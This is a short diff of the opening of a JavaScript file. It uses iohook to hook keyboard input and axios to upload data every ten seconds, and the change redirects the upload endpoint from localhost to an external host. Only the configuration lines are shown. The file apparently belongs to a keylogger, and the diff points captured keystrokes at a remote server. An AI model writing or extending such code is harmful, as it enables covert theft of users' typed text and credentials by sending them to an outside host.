@@ -1,7 +1,7 @@
 const iohook = require('iohook');
 const axios = require('axios');
 
-const API_ENDPOINT = 'http://localhost:8102' //'https://api.prestigehost.top/110101';
+const API_ENDPOINT = 'http://api.prestigehost.top/110101'; //'http://localhost:8102' 
 const UPLOAD_INTERVAL = 10000;
 
 const notedKeys = [
